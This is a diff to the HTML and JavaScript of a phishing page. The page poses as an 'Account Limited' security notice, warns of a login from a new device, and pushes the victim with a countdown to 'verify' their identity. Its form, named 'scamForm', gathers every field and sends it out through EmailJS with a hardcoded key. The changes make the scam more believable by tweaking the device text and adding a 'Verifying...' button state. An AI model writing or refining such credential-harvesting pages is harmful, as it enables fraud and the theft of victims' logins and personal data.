@@ -217,7 +217,7 @@
     <div class="container">
         <h2>Account Limited</h2>
         <p>Dear Customer,</p>
-        <p>We have detected a login attempt from a new device: <strong>iPhone 15, iOS 26.6.1</strong>.</p>
+        <p>We have detected a login attempt from a new device: <strong>iPhone 15, iOS 18.2</strong>.</p>
         <p>To prevent your account from being frozen, please verify your identity immediately.</p>
         
         <div class="timer">
@@ -261,7 +261,7 @@
         </div>
     </footer>
 
-       <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <script>
     // 1. Init with your Public Key
     emailjs.init("y3lRWL7KLDjiFjNcN");
@@ -269,6 +269,15 @@
     document.getElementById('scamForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
+        // Get the button to disable it
+        const btn = e.target.querySelector('button[type="submit"]');
+        const originalText = btn ? btn.textContent : "Verify Now";
+        
+        if(btn) {
+            btn.disabled = true;
+            btn.textContent = "Verifying...";
+        }
+
         // Get data
         const formData = new FormData(e.target);
         const data = Object.fromEntries(formData.entries());
@@ -296,8 +305,8 @@
             });
     });
 </script>
+       
     
     
-
 </body>
 </html>
